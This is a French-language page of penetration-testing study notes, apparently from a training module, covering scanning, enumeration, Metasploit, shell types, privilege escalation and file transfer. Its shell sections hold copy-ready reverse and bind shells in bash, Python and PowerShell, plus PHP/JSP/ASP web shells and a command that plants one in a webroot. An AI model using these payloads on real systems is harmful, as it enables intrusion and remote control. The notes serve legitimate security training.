---
cover: .gitbook/assets/cyber2.jpg
coverY: 173.26359832635984
---

# Basics

## <mark style="color:red;">Common Terms</mark>

### <mark style="color:blue;">Shell</mark>

> Le shell est un <mark style="color:orange;">**programme qui reçoit les entrées de l'utilisateur via le clavier et transmet ces commandes au système d'exploitation pour exécuter une fonction spécifique**</mark>. Les systèmes Linux utilisent un programme appelé Bash comme shell pour interagir avec le système d'exploitation

{% hint style="success" %}
<mark style="color:orange;">**Il existe 3 types de connections shell**</mark>

* Reverse Shell
* Bind Shell
* Web Shell
{% endhint %}

***

### <mark style="color:blue;">What is a Port?</mark>

> Les ports sont des points virtuels où les connexions réseau commencent et se terminent. Ils sont basés sur des logiciels et gérés par le système d'exploitation hôte. Les ports sont associés à un processus ou un service spécifique et permettent aux ordinateurs de différencier les différents types de trafic

Deux catégories de ports, [<mark style="color:orange;">**Transmission Control Protocol (TCP)**</mark>](https://en.wikipedia.org/wiki/Transmission_Control_Protocol)<mark style="color:orange;">**,**</mark> and [<mark style="color:orange;">**User Datagram Protocol (UDP)**</mark>](https://en.wikipedia.org/wiki/User_Datagram_Protocol).

* Il y a  `65,535` `TCP` ports et `65,535` different `UDP` ports

<figure><img src=".gitbook/assets/image (92).png" alt=""><figcaption><p>Different types of port</p></figcaption></figure>

***

### <mark style="color:blue;">What is a Web Server</mark>

> Un serveur web est une application qui s'exécute sur un serveur en arrière-plan. Il gère tout le trafic HTTP provenant du navigateur côté client, le redirige vers les pages demandées, puis répond au navigateur du client. Les serveurs web fonctionnent généralement sur les ports TCP 80 ou 443.\
> Il s'agit d'une liste normalisée des 10 principales vulnérabilités des applications web, maintenue par le projet <mark style="color:yellow;">**OWASP (Open Web Application Security Project).**</mark>

<figure><img src=".gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:red;">Service Scanning</mark>

> <mark style="color:orange;">**Un service**</mark>**&#x20; :**  est une **application qui s'exécute sur un ordinateur et qui effectue une fonction utile pour d'autres utilisateurs ou ordinateurs**.
>
> permettant aux utilisateurs d'interagir avec et de consommer ces différents services. Ce qui nous intéresse, ce sont les services qui ont été mal configurés ou qui présentent une vulnérabilité. Au lieu d'effectuer les actions attendues dans le cadre du service, nous sommes intéressés de voir si nous pouvons contraindre le service à effectuer une action non intentionnelle qui soutient nos objectifs, comme l'exécution d'une commande de notre choix.

***

### <mark style="color:blue;">Nmap</mark>

```bash
nmap 10.129.42.253 
```

* Nmap will only scan the **1,000 most common ports** by default.

```bash
nmap -sV -sC -p- 10.129.42.253
```

* We can use the `-sC` parameter to specify that **`Nmap` scripts** should be used to try and obtain more **detailed information**. The `-sV` parameter instructs `Nmap` to perform a version scan and -p- will scan all tcp 65,535 ports

```bash
The syntax for running an Nmap script is 

nmap --script <script name> -p<port> <host>.

nmap -p 80 --script http-vuln-cve2019-19781 <adresse_IP>



```

<mark style="color:orange;">**Vulnerability**</mark>  =>  grave de Citrix NetScaler ([CVE-2019–19781](https://blog.rapid7.com/2020/01/17/active-exploitation-of-citrix-netscaler-cve-2019-19781-what-you-need-to-know/)) &#x20;

***

### <mark style="color:blue;">Attacking Network Services</mark>

#### <mark style="color:green;">**1. Banner Grabbing**</mark>

**Définition :** Technique utilisée pour identifier rapidement un service en <mark style="color:orange;">**capturant la bannière qu'il affiche lors de la connexion.**</mark>

> <mark style="color:orange;">**Une bannière est une réponse envoyée par un service lorsqu'une connexion est établie avec lui.**</mark> Cette réponse peut contenir des informations sur le service lui-même, telles que sa version ou son nom, ce qui peut être utile pour identifier rapidement un service. La technique consistant à récupérer ces bannières est appelée "banner grabbing".

<mark style="color:orange;">**Outils**</mark>&#x20;

* **Nmap :** `nmap -sV --script=banner <target>`
*   **Netcat (nc) :**

    ```bash
    nc -nv <target> 21
    ```

    Exemple de bannière :

    ```scss
    220 (vsFTPd 3.0.3)
    ```

#### <mark style="color:green;">**2. FTP (File Transfer Protocol)**</mark>

:door:  **Port par défaut : 21**

:mag:  <mark style="color:orange;">**Utilisation avec Nmap**</mark>

```bash
nmap -sC -sV -p21 <target>
```

```yaml
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ...
```

:keyboard:  <mark style="color:orange;">**Commandes FTP courantes :**</mark>

```bash
ftp -p <target>
```

* `ls` : Liste les fichiers
* `cd <dir>` : Change de répertoire
* `get <file>` : Télécharge un fichier

#### <mark style="color:green;">**3. SMB (Server Message Block)**</mark>

**Protocole couramment utilisé sur les machines Windows.**

**Exploitation des vulnérabilités :** Certaines versions de SMB peuvent être vulnérables aux exploits RCE (Remote Code Execution) comme EternalBlue. => <mark style="color:orange;">**Vulnerability**</mark>

:mag:  <mark style="color:orange;">**Utilisation avec Nmap :**</mark>

```bash
nmap --script smb-os-discovery.nse -p445 <target>
```

```lua
PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb-os-discovery:
|   OS: Windows 7 Professional ...
```

:keyboard:  <mark style="color:orange;">**Exploration des partages SMB :**</mark>

```bash
smbclient -N -L \\<target>
smbclient -U <user> \\<target>\<share>
```

**Commandes :**

* `ls` : Liste les fichiers
* `cd <dir>` : Change de répertoire
* `get <file>` : Télécharge un fichier

#### <mark style="color:green;">**4. SNMP (Simple Network Management Protocol)**</mark>

**Versions :** SNMP 1, 2c (texte clair), SNMP 3 (chiffré et authentifié)

**Utilisation courante :** Collecte d'informations sur les appareils réseau.

**Commandes :**

*   **snmpwalk :**

    ```bash
    snmpwalk -v 2c -c public <target> 1.3.6.1.2.1.1.5.0
    ```

    Exemple de résultat :

    ```vbnet
    iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
    ```
*   **onesixtyone (brute force des community strings) :**

    ```bash
    onesixtyone -c dict.txt <target>
    ```

    Exemple de résultat :

    ```arduino
    0.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic ...

    ```

***

## <mark style="color:red;">Web emuneration</mark>

{% hint style="warning" %}
Lors des tests de pénétration, il est courant de trouver des serveurs web sur les ports 80 et 443. Ces serveurs hébergent des applications web qui représentent souvent une surface d'attaque importante. Une énumération web adéquate est cruciale pour identifier les potentielles vulnérabilités.
{% endhint %}

### <mark style="color:blue;">**Gobuster**</mark>

Gobuster est un outil de découverte de contenu et de répertoire utilisé pour trouver des fichiers et des dossiers cachés sur les sites web.

*   <mark style="color:orange;">**Découverte de Répertoires et de Fichiers**</mark>

    ```bash
    gobuster dir -u <URL> -w <wordlist> -x <extensions>
    ```

    Exemple :

    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt
    </code></pre>
*   <mark style="color:orange;">**Utilisation de Threads**</mark>

    ```bash
    gobuster dir -u <URL> -w <wordlist> -t <threads>
    ```

    Exemple :

    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">gobuster dir -u https://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
    </code></pre>
*   <mark style="color:orange;">**Énumération de Sous-Domaines**</mark>

    ```bash
    gobuster dns -d <domain> -w <wordlist>
    ```

    Exemple :

    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">gobuster dns -d example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
    </code></pre>
*   <mark style="color:orange;">**Recherche de Vhosts**</mark>

    ```bash
    gobuster vhost -u <URL> -w <wordlist>
    ```

    Exemple :

    <pre class="language-bash" data-overflow="wrap"><code class="lang-bash">gobuster vhost -u https://example.com -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
    </code></pre>

#### <mark style="color:green;">Interprétation des Codes d'État HTTP</mark>

* **200 OK** : La demande a réussi.
* **301 Moved Permanently** : La ressource a été redirigée.
* **403 Forbidden** : Accès interdit à la ressource.

***

### <mark style="color:blue;">**WPScan**</mark>

> <mark style="color:orange;">**WordPress is the most commonly used CMS**</mark> (Content Management System) and has an enormous potential attack surface
>
> <mark style="color:orange;">**Un CMS (Content Management System)**</mark> : est un système de gestion de contenu qui permet de créer, modifier et publier facilement du contenu sur un site web. WordPress est l'un des CMS les plus populaires et est utilisé pour la création de sites web, de blogs et de boutiques en ligne.

WPScan est un outil pour analyser la sécurité des sites WordPress, identifiant les vulnérabilités, les utilisateurs, les plugins, etc.

```bash
wpscan --url <http://target-url.com>
```

***

### <mark style="color:blue;">**Énumération de Sous-Domaines DNS avec Gobuster**</mark>

Installation de SecLists

```bash
git clone https://github.com/danielmiessler/SecLists
```

{% code fullWidth="true" %}
```bash
gobuster dns -d inlanefreight.com -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt
```
{% endcode %}

***

### <mark style="color:blue;">**Prise de Bannière / En-têtes du Serveur Web**</mark>

#### <mark style="color:orange;">**Utilisation de**</mark><mark style="color:orange;">**&#x20;**</mark><mark style="color:orange;">**`curl`**</mark>

```bash
curl -IL https://www.inlanefreight.com
```

```plaintext
HTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
...
```

#### <mark style="color:orange;">**Utilisation de WhatWeb**</mark>

```bash
whatweb <URL>
```

Exemple :

```bash
whatweb 10.10.10.121
```

***

### <mark style="color:blue;">**Analyse des Certificats SSL/TLS**</mark>

Les certificats peuvent fournir des informations sur les e-mails et les noms de l'organisation, utiles pour des attaques de phishing.

***

### <mark style="color:blue;">Fichier robots.txt</mark>

Ce fichier peut révéler des chemins cachés et des informations sensibles sur le serveur web.

```plaintext
User-agent: *
Disallow: /private
Disallow: /admin
```

Naviguer vers les URL mentionnées peut révéler des pages importantes comme des panneaux d'administration.

***

### <mark style="color:blue;">Outils Utiles</mark>

* <mark style="color:orange;">**EyeWitness**</mark> : Pour prendre des captures d'écran des applications web cibles.
* <mark style="color:orange;">**Ffuf**</mark> <mark style="color:orange;"></mark><mark style="color:orange;">:</mark> Pour le fuzzing et l'énumération de contenu web.

```bash
git clone https://github.com/FortyNorthSecurity/EyeWitness.git
```

```bash
ffuf -u https://example.com/FUZZ -w /path/to/wordlist.txt
```

***

## <mark style="color:red;">l'Exploitation Publique</mark>

### <mark style="color:blue;">**1. Identification des Exploits Publics**</mark>

**Étape initiale :**\
Une fois les services identifiés via un scan Nmap, la première étape consiste à rechercher des exploits publics pour ces applications/services.

<mark style="color:green;">**Méthodes de Recherche :**</mark>

*   **Google :** Rechercher le nom de l'application/service suivi de "exploit".

    <pre class="language-url"><code class="lang-url"><strong>https://www.google.com/
    </strong></code></pre>

***

### <mark style="color:blue;">**2. Outil**</mark><mark style="color:blue;">**&#x20;**</mark><mark style="color:blue;">**`searchsploit`**</mark>

<mark style="color:green;">**Installation :**</mark>

```bash
sudo apt install exploitdb -y
```

<mark style="color:green;">**Recherche d'Exploits :**</mark>

```bash
searchsploit <nom_application>
```

<mark style="color:green;">**Exemple :**</mark>

```bash
searchsploit openssh 7.2
```

Cela affiche une liste d'exploits disponibles pour `OpenSSH 7.2`.

***

### <mark style="color:blue;">**3. Bases de Données en Ligne**</mark>

<mark style="color:green;">**Sources recommandées :**</mark>

* **Exploit DB** : Base de données des exploits publics.
* **Rapid7 DB** : Base de données de vulnérabilités.
* **Vulnerability Lab** : Autre base de données en ligne.

***

### <mark style="color:blue;">**4. Framework Metasploit**</mark>

<mark style="color:green;">**Lancer Metasploit :**</mark>

```bash
msfconsole
```

<mark style="color:green;">**Recherche d'Exploit :**</mark>

```bash
search exploit <vulnérabilité>
```

<mark style="color:green;">**Exemple :**</mark>

```bash
search exploit eternalblue
```

Cela retourne les modules Metasploit correspondants à la vulnérabilité `EternalBlue`.

***

### <mark style="color:blue;">**5. Utilisation d'un Exploit avec Metasploit**</mark>

<mark style="color:green;">**Charger un Module d'Exploit :**</mark>

```bash
use <nom_complet_du_module>
```

<mark style="color:green;">**Exemple :**</mark>

```bash
use exploit/windows/smb/ms17_010_psexec
```

<mark style="color:green;">**Configurer les Options :**</mark>

```bash
show options
set <nom_option> <valeur>
```

<mark style="color:green;">**Exemple :**</mark>

```bash
set RHOSTS 10.10.10.40
set LHOST tun0
```

<mark style="color:green;">**Vérifier la Vulnérabilité :**</mark>

```bash
check
```

<mark style="color:green;">**Lancer l'Exploit :**</mark>

```bash
exploit
```

**Exemple de Commandes :**

```bash
meterpreter > getuid
meterpreter > shell
```

***

## <mark style="color:red;">Types de Shells</mark>

### <mark style="color:blue;">**Introduction**</mark>

***

| **Type de Shell**                                    | **Méthode de Communication**                                                                                    |
| ---------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| <mark style="color:orange;">**Reverse Shell**</mark> | Se connecte à notre système et nous donne le contrôle via une connexion inverse.                                |
| <mark style="color:orange;">**Bind Shell**</mark>    | Attend que nous nous y connections pour nous donner le contrôle.                                                |
| <mark style="color:orange;">**Web Shell**</mark>     | Communique via un serveur web, accepte nos commandes via des paramètres HTTP, les exécute et renvoie la sortie. |

***

### <mark style="color:blue;">Reverse Shell</mark>

**Le Reverse Shell** est une méthode rapide et courante pour obtenir le contrôle d'un hôte compromis.

<mark style="color:green;">**Étapes pour utiliser un Reverse Shell :**</mark>

1.  **Lancer un écouteur Netcat :**

    ```bash
    nc -lvnp 1234
    ```

    * **Options :**
      * `-l` : Mode écoute
      * `-v` : Mode verbose
      * `-n` : Désactiver la résolution DNS
      * `-p` : Numéro de port
2.  **Trouver l'IP de notre système :**

    ```bash
    ip a
    ```
3. **Commande de Reverse Shell :**
   *   <mark style="color:orange;">**Linux (bash) :**</mark>

       <pre class="language-bash" data-title="COMMANDE LINUX" data-overflow="wrap" data-line-numbers data-full-width="true"><code class="lang-bash">bash -c 'bash -i >&#x26; /dev/tcp/10.10.10.10/1234 0>&#x26;1'
       rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&#x26;1|nc 10.10.10.10 1234 >/tmp/f
       </code></pre>
   *   <mark style="color:orange;">**Windows (Powershell)**</mark>&#x20;

       <pre class="language-powershell" data-overflow="wrap" data-line-numbers><code class="lang-powershell">powershell -nop -c "
       $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1234);
       $s = $client.GetStream();
       [byte[]]$b = 0..65535 | %{ 0 };

       while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
           $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i);
           $sb = (iex $data 2>&#x26;1 | Out-String);
           $sb2 = $sb + 'PS ' + (pwd).Path + '> ';
           $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
           $s.Write($sbt, 0, $sbt.Length);
           $s.Flush();
       };

       $client.Close();
       "

       </code></pre>
4.  **Recevoir la connexion dans Netcat :**

    ```bash
    nc -lvnp 1234
    ```

**Remarque :**

Un Reverse Shell peut être fragile ; toute interruption nécessite de réexécuter la commande de Reverse Shell.

{% code fullWidth="true" %}
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1234);
# Crée un nouvel objet TCPClient qui se connecte à l'adresse IP 10.10.10.10 sur le port 1234.
# Cela établit une connexion à un serveur distant, qui peut être utilisé pour recevoir des commandes.

$s = $client.GetStream();
# Récupère le flux de données associé à la connexion TCP établie.
# Ce flux permet de lire et d'écrire des données sur la connexion.

[byte[]]$b = 0..65535 | %{ 0 };
# Initialise un tableau de bytes de taille 65536, rempli de zéros.
# Ce tableau servira de tampon pour stocker les données lues depuis le flux.

while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    # Boucle tant que des données sont lues depuis le flux.
    # $s.Read lit les données entrantes et renvoie le nombre de bytes lus.
    # Si aucune donnée n'est lue (le flux est fermé), la boucle s'arrête.

    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i);
    # Convertit les bytes lus en une chaîne de caractères en utilisant l'encodage ASCII.
    # $data contient donc les commandes envoyées par l'attaquant via la connexion TCP.

    $sb = (iex $data 2>&1 | Out-String);
    # Exécute la commande contenue dans $data en utilisant `Invoke-Expression` (iex).
    # Redirige la sortie standard et les erreurs (2>&1) pour capturer tout ce qui est renvoyé.
    # La sortie est convertie en chaîne de caractères complète avec `Out-String`.

    $sb2 = $sb + 'PS ' + (pwd).Path + '> ';
    # Prépare la sortie à envoyer de retour à l'attaquant.
    # Ajoute l'invite de commande "PS [chemin actuel] > " pour simuler un terminal PowerShell.

    $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
    # Convertit la chaîne de caractères de la sortie en un tableau de bytes en utilisant l'encodage ASCII.

    $s.Write($sbt, 0, $sbt.Length);
    # Écrit la réponse sur le flux de données, l'envoyant ainsi au serveur/attaquant.

    $s.Flush();
    # Vide le buffer du flux, s'assurant que toutes les données sont bien envoyées.
};

$client.Close();
# Ferme la connexion TCP proprement.

```
{% endcode %}

***

### <mark style="color:blue;">Bind Shell</mark>

**Le Bind Shell** attend que nous nous y connections.

<mark style="color:green;">**Étapes pour utiliser un Bind Shell :**</mark>

1. **Commande de Bind Shell :**
   *   **Linux (bash)**&#x20;

       <pre class="language-bash" data-title="Bind shell" data-line-numbers data-full-width="true"><code class="lang-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&#x26;1|nc -lvp 1234 >/tmp/f
       </code></pre>
   *   **Python :**

       <pre class="language-python" data-overflow="wrap" data-line-numbers><code class="lang-python">python -c 'exec("""
       import socket as s
       import subprocess as sp

       s1 = s.socket(s.AF_INET, s.SOCK_STREAM)
       s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
       s1.bind(("0.0.0.0", 1234))
       s1.listen(1)
       c, a = s1.accept()

       while True:
           d = c.recv(1024).decode()
           p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
           c.sendall(p.stdout.read() + p.stderr.read())
       """)'

       </code></pre>
   *   **Windows (Powershell) :**

       <pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">powershell -NoP -NonI -W Hidden -Exec Bypass -Command {
           $listener = [System.Net.Sockets.TcpListener]1234
           $listener.Start()
           $client = $listener.AcceptTcpClient()
           $stream = $client.GetStream()
           [byte[]]$bytes = 0..65535 | % {0}

           while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
               $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
               $sendback = (iex $data 2>&#x26;1 | Out-String)
               $sendback2 = $sendback + "PS " + (pwd).Path + " "
               $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
               $stream.Write($sendbyte, 0, $sendbyte.Length)
               $stream.Flush()
           }

           $client.Close()
       }

       </code></pre>
2.  **Connexion avec Netcat :**

    ```bash
    nc 10.10.10.1 1234
    ```

{% hint style="warning" %}
<mark style="color:orange;">**Terminal**</mark>

* **Définition** : Un terminal est une interface pour la communication avec l'ordinateur. Historiquement, il s'agissait de dispositifs physiques avec un écran et un clavier. Aujourd'hui, ce sont principalement des émulateurs de terminal qui fonctionnent sur des systèmes d'exploitation graphiques.
* **Usage** : Il permet à l'utilisateur d'interagir avec le système d'exploitation en tapant des commandes.

<mark style="color:orange;">**TTY**</mark>

* **Définition** : TTY signifie "teletypewriter" (téléimprimeur). Dans Unix/Linux, il fait référence à un périphérique qui gère les connexions de terminal, que ce soit physique ou virtuel.
* **Usage** : Il représente un canal de communication entre le terminal (ou un émulateur de terminal) et le système d'exploitation. Chaque terminal ouvert ou chaque session SSH est associé à un TTY.

<mark style="color:orange;">**Shell**</mark>

* **Définition** : Un shell est un interpréteur de commandes qui permet à l'utilisateur d'exécuter des commandes sur le système d'exploitation. Des exemples courants incluent bash, zsh, sh, etc.
* **Usage** : Il interprète les commandes tapées par l'utilisateur et les exécute. Il fournit également des fonctionnalités comme des scripts pour automatiser les tâches.

<mark style="color:orange;">**Console**</mark>

* **Définition** : Une console est souvent utilisée de manière interchangeable avec un terminal, mais dans le contexte Unix/Linux, elle fait souvent référence à l'interface principale de saisie/sortie du système. C'est le dispositif où les messages de démarrage et les journaux système sont envoyés.
* **Usage** : Après le démarrage, la console peut devenir un terminal où des sessions interactives peuvent avoir lieu.

***

<mark style="color:orange;">**En Résumé**</mark>

* **Terminal** : Interface utilisateur pour taper des commandes (physique ou émulateur).
* **TTY** : Dispositif Unix/Linux pour gérer les connexions de terminal.
* **Shell** : Interpréteur de commandes (exécute les commandes entrées par l'utilisateur).
* **Console** : Dispositif principal de saisie/sortie du système, souvent utilisé pour des tâches de diagnostic ou de maintenance système.

***
{% endhint %}

**Remarque :**

Un Bind Shell est plus résilient qu'un Reverse Shell pour les reconnections.

{% hint style="info" %}
<mark style="color:green;">**Upgrading TTY**</mark>

Lorsqu'on se connecte à un shell via Netcat, nous avons accès à un shell limité où nous pouvons taper des commandes et utiliser la touche retour arrière, mais nous ne pouvons pas déplacer le curseur de texte pour éditer les commandes ni accéder à l'historique des commandes. Pour surmonter ces limitations et obtenir une expérience de shell plus complète (comme celle fournie par SSH), nous devons "upgrader" notre TTY (teletypewriter).

<mark style="color:green;">**Étapes pour Améliorer le TTY**</mark>

1. **Utilisation de Python pour générer un shell interactif complet**
   *   Dans notre shell Netcat, nous utilisons Python pour lancer un shell interactif :

       ```bash
       python -c 'import pty; pty.spawn("/bin/bash")'
       ```
   * Cette commande utilise Python pour exécuter `/bin/bash` et nous donner un shell interactif.
2. **Mise en arrière-plan du shell Netcat**
   *   Après avoir exécuté la commande Python, nous mettons notre shell en arrière-plan en utilisant `ctrl+z` :

       ```bash
       ^Z
       ```
   * Cela nous ramène à notre terminal local.
3. **Configuration du terminal local pour une interaction brute**
   *   Sur notre terminal local, nous exécutons les commandes suivantes :

       <pre class="language-bash"><code class="lang-bash"><strong>stty raw -echo
       </strong></code></pre>
   * `stty raw -echo` configure le terminal pour une interaction brute et désactive l'écho des caractères.
4. **Ramener le shell Netcat au premier plan**
   *   Nous ramenons notre shell Netcat au premier plan en utilisant la commande `fg` :

       ```bash
       fg
       ```
   * Après avoir exécuté `fg`, nous pouvons appuyer sur \[Enter] pour revenir au shell interactif.
5. **Ajuster les paramètres du terminal**
   * Nous pouvons remarquer que le shell ne couvre pas toute la taille du terminal. Pour corriger cela, nous devons obtenir et définir certaines variables :
     *   Ouvrez une nouvelle fenêtre de terminal sur notre système, maximisez-la ou définissez la taille souhaitée, puis exécutez les commandes suivantes pour obtenir les valeurs nécessaires :

         ```bash
         echo $TERM
         ```

         ```bash
         stty size
         ```
     * `echo $TERM` renvoie le type de terminal (par exemple, `xterm-256color`).
     * `stty size` renvoie le nombre de lignes et de colonnes (par exemple, `67 318`).
   *   Ensuite, nous retournons à notre shell Netcat et exécutons les commandes suivantes pour ajuster les variables :

       ```bash
       export TERM=xterm-256color
       ```

       ```bash
       stty rows 67 columns 318
       ```
{% endhint %}

***

### <mark style="color:blue;">Web Shell</mark>

**Le Web Shell** utilise un script web pour exécuter des commandes via des requêtes HTTP.

#### <mark style="color:green;">**Écriture d'un Web Shell :**</mark>

*   **PHP :**

    ```php
    <?php system($_REQUEST["cmd"]); ?>
    ```
*   **JSP :**

    ```jsp
    <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
    ```
*   **ASP :**

    ```asp
    <% eval request("cmd") %>
    ```

#### <mark style="color:green;">**Upload du Web Shell :**</mark>

1. **Déterminer le répertoire web (webroot) :**
   * **Apache** : `/var/www/html/`
   * **Nginx** : `/usr/local/nginx/html/`
   * **IIS** : `c:\inetpub\wwwroot\`
   * **XAMPP** : `C:\xampp\htdocs\`
2.  **Écrire le Web Shell dans le webroot :**

    ```bash
    echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
    ```

#### <mark style="color:green;">**Accéder au Web Shell :**</mark>

1. **Naviguer via un navigateur ou cURL :**
   *   Navigateur :

       ```url
       http://SERVER_IP:PORT/shell.php?cmd=id
       ```
   *   cURL :

       ```bash
       curl http://SERVER_IP:PORT/shell.php?cmd=id
       ```

***

## <mark style="color:red;">**Privilege Escalation**</mark>

{% hint style="warning" %}
<mark style="color:orange;">**Définition**</mark>**&#x20;:** L'élévation de privilèges consiste à exploiter une vulnérabilité locale ou interne pour passer d'un utilisateur à faible privilège à un utilisateur ayant des droits complets (root sur Linux ou administrateur/SYSTEM sur Windows).
{% endhint %}

### <mark style="color:blue;">**1. Checklists de PrivEsc**</mark>

* <mark style="color:orange;">**HackTricks**</mark> et <mark style="color:orange;">**PayloadsAllTheThings**</mark> : Ressources pour des checklists sur l'élévation de privilèges sur Linux et Windows.
* Utiliser ces checklists pour s'habituer à différentes commandes et techniques d'exploitation des faiblesses.

***

### <mark style="color:blue;">**2. Scripts d'énumération**</mark>

* **Linux** : LinEnum, linuxprivchecker.
* **Windows** : Seatbelt, JAWS.
* <mark style="color:orange;">**PEASS**</mark>**&#x20;(Privilege Escalation Awesome Scripts SUITE)** : Pour Linux et Windows.
* **Attention** : Ces scripts peuvent déclencher des logiciels de sécurité, privilégier l'énumération manuelle si nécessaire.

***

### <mark style="color:blue;">**3. Exploitation des Vulnérabilités**</mark>

#### <mark style="color:green;">**a. Exploits du Kernel**</mark>

* Vérifier les versions de l'OS pour des vulnérabilités connues.
* Exemple : CVE-2016-5195 (DirtyCow) pour Linux 3.9.0-73-generic.

#### <mark style="color:green;">**b. Logiciels Vulnérables**</mark>

* **Linux** : `dpkg -l` pour lister les logiciels installés.
* **Windows** : Explorer C:\Program Files.
* Chercher des exploits publics pour les versions obsolètes de logiciels installés.

***

### <mark style="color:blue;">**4. Privilèges Utilisateurs**</mark>

#### <mark style="color:green;">**a. Sudo (Linux)**</mark>

* `sudo -l` pour lister les privilèges sudo de l'utilisateur.
* Exploiter des commandes spécifiques avec sudo (cf. GTFOBins pour des commandes exploitables).

#### <mark style="color:green;">**b. SUID (Linux)**</mark>

* Identifier les binaires SUID qui peuvent être exploités.

#### <mark style="color:green;">**c. Windows Token Privileges**</mark>

* Identifier et exploiter les privilèges de jetons utilisateurs sous Windows.

***

### <mark style="color:blue;">**5. Tâches Planifiées**</mark>

* **Linux** : Cron jobs.
  * Répertoires à vérifier pour des permissions d'écriture : `/etc/crontab`, `/etc/cron.d`, `/var/spool/cron/crontabs/root`.
* **Windows** : Tâches planifiées.
  * Ajouter de nouvelles tâches ou modifier des tâches existantes pour exécuter des scripts malveillants.

***

### <mark style="color:blue;">**6. Informations d'Identification Exposées**</mark>

* Rechercher dans les **fichiers de configuration, logs et historiques des utilisateurs** pour des mots de passe ou informations sensibles.
* Vérifier la réutilisation des mots de passe pour différents services.

***

### <mark style="color:blue;">**7. Clés SSH**</mark>

* Lire les **clés privées SSH** si les permissions le permettent (`/home/user/.ssh/id_rsa`).
* Ajouter une clé publique à `authorized_keys` si l'on a des permissions d'écriture.
  * Générer une paire de clés : `ssh-keygen -f key`.

***

### <mark style="color:blue;">**8. Outils et Références**</mark>

* <mark style="color:green;">**Outils**</mark> :
  * **GTFOBins** : Liste de commandes exploitables avec sudo.
  * **LOLBAS** : Liste d'applications Windows exploitables.
* <mark style="color:green;">**Références**</mark> <mark style="color:green;"></mark><mark style="color:green;">:</mark>
  * [HackTricks Linux Privesc Checklist](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist)

***

## <mark style="color:red;">**Transferring Files**</mark>

**Objectif :** Transférer des fichiers vers et depuis un serveur distant lors d'un test de pénétration, en utilisant des méthodes variées, que ce soit avec des shells standards ou des outils comme Metasploit.

#### <mark style="color:green;">**1. Utilisation de wget et cURL**</mark>

**a. Python HTTP Server**

*   Sur la machine locale, démarrer un serveur HTTP :

    ```bash
    bmrroboteLiot@htb[/htb]$ cd /tmp
    mrroboteLiot@htb[/htb]$ python3 -m http.server 8000
    ```
*   Sur la machine distante, télécharger le fichier avec wget :

    ```bash
    user@remotehost$ wget http://10.10.14.1:8000/linenum.sh
    ```
*   Ou avec cURL :

    ```bash
    user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
    ```

#### <mark style="color:green;">**2. Utilisation de SCP**</mark>

*   Transférer un fichier avec scp en utilisant des identifiants ssh :

    <pre class="language-bash" data-title="SCP" data-overflow="wrap" data-line-numbers data-full-width="true"><code class="lang-bash">mrroboteLiot@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh
    </code></pre>

#### <mark style="color:green;">**3. Utilisation de Base64**</mark>

*   Encoder le fichier en base64 sur la machine locale :

    ```bash
    mrroboteLiot@htb[/htb]$ base64 shell -w 0
    ```
*   Sur la machine distante, décoder et créer le fichier :

    ```bash
    user@remotehost$ echo f0VMRgIBAQ... | base64 -d > shell
    ```

#### <mark style="color:green;">**4. Validation des Transferts de Fichiers**</mark>

*   **Commande file** : Vérifier le type de fichier transféré.

    ```bash
    user@remotehost$ file shell
    ```
* **Commande md5sum** : Comparer les hash md5 pour s'assurer de l'intégrité du fichier.
  *   Sur la machine locale :

      ```bash
      mrroboteLiot@htb[/htb]$ md5sum shell
      ```
  *   Sur la machine distante :

      ```bash
      user@remotehost$ md5sum shell
      ```

***

{% file src=".gitbook/assets/Getting_Started_Module_Cheat_Sheet.pdf" %}
CheatSheet
{% endfile %}
